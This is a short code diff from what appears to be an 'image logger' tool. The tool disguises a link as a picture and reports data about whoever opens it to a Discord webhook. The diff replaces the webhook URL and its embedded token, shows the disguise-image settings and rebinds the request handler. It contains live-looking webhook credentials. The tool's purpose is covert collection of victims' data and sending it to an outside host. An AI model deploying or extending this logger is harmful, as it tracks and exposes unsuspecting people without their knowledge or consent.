@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1451296620556718162/iih9pYNT0lkaUKHBQw2EuJb13WsGiAdnVBi8XuOb2Xa_m5OJd4HyGPETHVvkCWeXdrMz",
+    "webhook": "https://discord.com/api/webhooks/1451296623920677000/m6nY91H_pD2Rv-h2OyZKJ6dpFDR22zzCxA4zs6bAuuM7HDWDMKo11Z3j_0bczka4HRK1",
     "image": "https://i.pinimg.com/736x/df/96/d8/df96d84e03317bba5b9961e75382ec37.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -301,4 +301,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-def handler(request):
+handler = ImageLoggerAPI
